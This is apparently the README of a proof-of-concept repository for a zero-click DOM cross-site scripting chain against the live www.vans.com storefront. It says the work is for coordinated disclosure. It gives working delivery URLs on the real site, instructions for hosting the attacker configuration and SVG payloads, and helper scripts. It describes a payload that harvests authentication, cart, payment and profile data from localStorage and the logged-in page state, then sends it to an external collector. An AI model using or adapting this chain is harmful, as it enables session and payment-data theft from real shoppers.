# Vans Customs Toolkit — 0-click DOM XSS PoC (attacker asset host)

This repository is the **attacker-controlled static asset tree** for the confirmed
0-click DOM XSS on `www.vans.com`. It is meant to be published to GitHub so that
`raw.githubusercontent.com` can serve it — that host sends `Access-Control-Allow-Origin: *`,
which the PoC requires (the app fetches the config/SVGs cross-origin).

> Scope: this is a PoC for a coordinated disclosure / engagement against an
> in-scope target. It contains no target credentials and no destructive payload.

---

## 1. The chain (why this tree exists)

1. `https://www.vans.com/vfdp-customs-toolkit-prod/index.html` reads a legacy
   query parameter **`domainName`** and uses it to build the runtime config URL:
   `"$domainName"/vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc/configuration.json`
2. That config + `endpoints*.json` are merged **without validating the origin**, so
   the keys that point at the asset/CDN service (`customsAssets`,
   `customsSvgServiceEndpoint`, `tiles`, `combinations`, `translations`, …) become
   attacker-controlled.
3. When the toolkit renders an icon/randomizer graphic it does
   `fetch(assetsPath + svg)` and assigns the response to `domProps.innerHTML`.
   `innerHTML` does **not** execute `<script>`, but it **does** execute inline
   event handlers — so the SVG we serve uses
   `<img src=x onerror=...>` and `<animate ... onbegin=...>`.
4. Result: **script execution in the `www.vans.com` origin**, 0 clicks on the
   `?loadUGC=true` route (the payload fires from the modal back/close icons), and
   2 clicks on the `?loadRandomizer=...` route.

## 2. CORS requirement (read this first)

The app fetches this tree **cross-origin**, so the host must reply with:

```
Access-Control-Allow-Origin: *
```

* `raw.githubusercontent.com` — **yes**, sends `ACAO: *` (verified live).
* `cdn.jsdelivr.net` — yes, also sends `ACAO: *` (good backup / cache-busting).
* `*.surge.sh` — **NO** `ACAO` header at all → the chain does **not** work from surge.
* plain nginx/apache — must be configured with `add_header Access-Control-Allow-Origin *;`.

## 3. BASE URL pattern (the one value that matters)

```
BASE = https://raw.githubusercontent.com/<user>/<repo>/<branch>
```

Example:

```
BASE = https://raw.githubusercontent.com/nope8824/vans-xss-poc/main
```

The tree must sit at the **repository root**, so the app resolving
`BASE + /vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc/configuration.json`
hits:

```
https://raw.githubusercontent.com/<user>/<repo>/<branch>/vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc/configuration.json
```

### Changing the base

Every absolute URL in this tree is derived from that one base. To change it:

```bash
./tools/setbase.sh https://raw.githubusercontent.com/<user>/<repo>/<branch>
git add -A && git commit -m "set base" && git push
```

`tools/setbase.sh` rewrites **every** occurrence (endpoints JSON asset keys, the
`/fired` beacon inside each SVG, etc.) and is idempotent.

> The files currently contain the placeholder `https://raw.githubusercontent.com/USER/REPO/main`.
> Run `setbase.sh` with your real `user/repo/branch` **before** pushing.

## 4. Delivery URLs (after `setbase.sh` + push)

Let `BASE` be your raw base.

| # | Route | URL | Clicks |
|---|-------|-----|--------|
| b | toolkit (0-click) | `https://www.vans.com/vfdp-customs-toolkit-prod/index.html?loadUGC=true&domainName=BASE` | 0 |
| c | toolkit nora caid | `https://www.vans.com/vfdp-customizer-nora-prod/index.html?caid=nora-en-us-sfcc-canvas&domainName=BASE` | 0 |
| d | parent product page | `https://www.vans.com/en-us/customizer/ultrarange-exo?domainName=BASE` | 0 |

## 5. Verify the deployment

```bash
/home/amnotacat/Desktop/vans-xss-poc/verify.sh https://raw.githubusercontent.com/<user>/<repo>/<branch>
```

It asserts, for every required path, `HTTP 200` + `Access-Control-Allow-Origin: *`
and that the JSON/SVG bodies contain the rewritten base, the inline `onerror`
handler, `alert('XSS on '`, the `__XSS_FIRED` marker, the `position:fixed` overlay
and the `<BASE>/fired?d=` beacon.

## 6. What success looks like in the browser

Open a delivery URL in a browser (Burp browser works). You should see:

* a red full-width banner: `XSS EXECUTED on www.vans.com`
* a fixed, high-z-index panel titled **XSS EXFILTRATION PROOF** listing every
  harvested localStorage key + value preview and the `window.top.__NUXT__`
  state (see section 8) - this is the screenshot proof
* `window.__XSS_FIRED === true` and `document.title === 'XSS EXFIL PROOF - www.vans.com'`
* a Network entry `POST <EXFIL>` plus a `GET <EXFIL>?d=www.vans.com&n=<count>&k=<keys>`
  image beacon (both land in the OOB collector you configured)

## 7. Tree

```
fired                                             # static beacon sink ({} JSON)
evil/tiles
evil/combos/<model>
evil/images/common/customs_logo_red.png
evil/svg/customizer/{icon-back.svg,icon-close.svg}          # 0-click payloads
evil/svg/randomizer/sk8-hi/sk8-hi-left-view.svg             # randomizer payload
vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc/{configuration,endpoints,endpoints-randomizer,endpoints-ugcentrypoint,translation}.json
vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc-canvas/{configuration,endpoints}.json
tools/setbase.sh
```

Payloads are **non-destructive**: they set JS markers, draw an overlay, read
localStorage / hydration state, and fire a beacon. They do not modify data on
the target and make no account mutations.

## 8. Impact payload - localStorage + `window.top.__NUXT__` harvest

The three SVG payloads are impact variants, not just proof-of-execution. The
customizer injects SVG through `innerHTML`, so `<script>` does not run; the
payload rides inline event handlers (`onerror` on a broken `<img>` and `onbegin`
on an SVG `<animate>`), which the HTML parser does execute. On execution the
handler (READ-ONLY) does:

1. harvests every `localStorage` entry whose key matches
   `/auth|cart|favorit|user|pay|loyal|profile|checkout/i` (value truncated to
   400 chars) - e.g. `auth_US`, `cart_US`, `favorites_US`, `checkout_US`;
   (this works because the toolkit iframe is **same-origin** with the top
   storefront, so the iframe reads the storefront's persisted store)
2. reads `window.top.__NUXT__` - top-level keys plus `.state`, `.data` and
   `.pinia` - and any `__pinia` / `__APOLLO_STATE__` globals, i.e. the live
   Nuxt hydration state of the logged-in storefront;
3. renders the **XSS EXFILTRATION PROOF** overlay: red banner, match counter,
   and a per-key table (screenshot-able at 1440x900);
4. POSTs the harvested JSON to `EXFIL` (`mode:'no-cors'`, text/plain body up to
   60 KB) and fires an `<img>` GET beacon
   `EXFIL?d=<domain>&n=<count>&k=<keys>` as an independent second channel;
5. sets `window.__XSS_FIRED = true` and `document.title`.

`EXFIL` is one constant at the top of `tools/gen_exfil_svg.py`:

```bash
EXFIL=https://<your-id>.oast.me/exfil python3 tools/gen_exfil_svg.py   # regenerate all 3 SVGs
```

The shipped default is an interactsh collector (ephemeral). A static host
(raw.githubusercontent.com) cannot log requests, so point `EXFIL` at your own
interactsh / webhook.site / Burp Collaborator endpoint before deploying.
Regenerating rewrites only the 3 SVGs; re-run `tools/setbase.sh <base>` if you
also changed the base, then commit + push.

Validate locally (injects the payload through `innerHTML` and asserts the
overlay, the harvest and the marker globals):

```bash
python3 tools/exfil_harness.py     # -> VERDICT: PASS, writes tools/EXFIL_OVERLAY_SCREENSHOT.png
```
